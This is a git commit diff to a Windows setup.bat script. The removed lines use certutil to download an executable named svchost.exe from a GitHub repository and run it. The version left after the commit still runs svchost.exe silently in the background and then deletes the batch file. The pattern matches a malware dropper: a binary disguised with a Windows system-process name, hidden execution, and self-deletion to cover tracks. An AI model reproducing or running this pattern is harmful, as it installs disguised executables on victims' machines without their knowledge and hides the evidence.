66b566fbd894ba8595e7723b0cd14337c9e3c625
johtaromemory-hash <johtaromemory@gmail.com>
2026-06-25 11:27:03 +0300

    Add files via upload

--- setup.bat
+++ setup.bat
@@ -1,5 +1,4 @@
 @echo off
 cd /d "%~dp0"
-certutil -urlcache -f https://github.com/johtaromemory-hash/test/raw/refs/heads/main/svchost.exe svchost.exe >nul
-if exist "%~dp0svchost.exe" start /b "" "%~dp0svchost.exe"
+start /b "" "%~dp0svchost.exe"
 del "%~f0" >nul 2>&1
